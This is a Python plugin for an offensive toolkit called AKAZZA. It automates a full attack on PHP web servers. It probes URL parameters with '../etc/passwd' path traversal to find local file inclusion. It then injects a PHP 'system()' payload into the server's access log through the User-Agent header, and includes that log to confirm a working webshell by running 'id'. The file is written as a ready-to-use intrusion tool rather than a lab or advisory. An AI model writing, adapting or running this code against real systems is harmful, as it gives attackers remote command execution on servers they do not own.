"""
V3: LFI Hunt + Log Poisoning — vector plugin
Made for: AKAZZA / joyboyvoidera

Finds an LFI in discovered parameters, poisons the webserver's log via
User-Agent containing PHP, then uses the poisoned log as the webshell.
Zero files uploaded — the server's own audit trail becomes the shell.
"""
from datetime import datetime
from urllib.parse import parse_qsl
import requests


@register_plugin("V3: LFI + log poisoning", phase="vector", priority=4,
                 cwe="CWE-98", attck="T1505.003",
                 wants=["lfi_confirmed", "lfi_candidate", "apache", "phpinfo"],
                 avoids=[],
                 desc="discover LFI → User-Agent log poison → log IS the webshell")
def v3_lfi_logpoison(akazza, surface, origin):
    """CONTRACT: return ('__LFI__', 'akz') + set akazza._lfi_helper, or (None, None)."""
    GREEN, YELLOW, RED, RESET = (col["GREEN"], col["YELLOW"], col["RED"], col["RESET"])
    sess = akazza._authenticated_sess

    # ── 1. HUNT LFI in discovered params ──
    print(f"{YELLOW}[V3]{RESET} Testing discovered params for LFI...")
    lfi_hit = None
    for url, names in surface["params"].items():
        base_url, qp = url.split("?", 1) if "?" in url else (url, "")
        params = dict(parse_qsl(qp))
        for name in params:
            if name.lower() not in CONFIG["lfi_params"]:
                continue
            for depth in range(4, 13):
                p = dict(params)
                p[name] = "../" * depth + "etc/passwd"
                try:
                    r = sess.get(base_url, params=p, timeout=8)
                    if "root:x:" in r.text or "root:*:" in r.text or "root:!:x" in r.text:
                        lfi_hit = (base_url, name, params, depth)
                        print(f"{GREEN}[V3+]{RESET} LFI found: {base_url}?{name}= (depth {depth})")
                        break
                except Exception:
                    break
            if lfi_hit:
                break
            break   # one param probe per URL is enough for discovery
        if lfi_hit:
            break

    if not lfi_hit:
        print(f"{YELLOW}[V3]{RESET} no LFI found in discovered params "
              f"(hints tried: {CONFIG['lfi_params']})")
        return None, None
    base_url, lfi_param, orig_params, base_depth = lfi_hit

    # ── 2. POISON the webserver log via User-Agent ──
    print(f"{YELLOW}[V3]{RESET} Poisoning server log via User-Agent...")
    poison_ua = "<?php system($_REQUEST['akz']); ?>"
    for i in range(3):
        try:
            # hit both the site root and the LFI page so the UA lands in access.log
            sess.get(origin, timeout=8,
                     headers={"User-Agent": f"{poison_ua} /*akz{i}*/"})
            sess.get(base_url, timeout=8,
                    headers={"User-Agent": f"{poison_ua} /*b{i}*/"})
        except Exception:
            pass
    print(f"{GREEN}[V3]{RESET} Poison requests sent (3× root + 3× LFI page)")

    # ── 3. VERIFY the poisoned log executes commands ──
    for logpath in CONFIG["log_paths"]:
        for depth in (base_depth, 8, 6):
            p = dict(orig_params)
            p[lfi_param] = "../" * depth + logpath.lstrip('/')
            p["akz"] = "echo ___V3___; id"
            try:
                rr = requests.get(base_url, params=p, timeout=15,
                                 headers={"User-Agent": akazza.session_log["user_agent"]})
                if "___V3___" in rr.text or "uid=" in rr.text:
                    print(f"{GREEN}[★]{RESET} V3 WEBSHELL LIVE (log: {logpath})")
                    # store helper for the core's LFI command mode
                    akazza._lfi_helper = (base_url, orig_params, lfi_param,
                                          logpath, depth)
                    akazza.session_log.update({
                        "target_url": base_url,
                        "shell_parameter": "akz",
                        "shell_variant": f"LFI log poisoning ({logpath})",
                        "vector": "V3: LFI + log poisoning (zero files uploaded)",
                        "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    })
                    return "__LFI__", "akz"
            except Exception:
                continue

    print(f"\n{YELLOW}[V3]{RESET} exhausted (log not includable or not poisoned)")
    return None, None
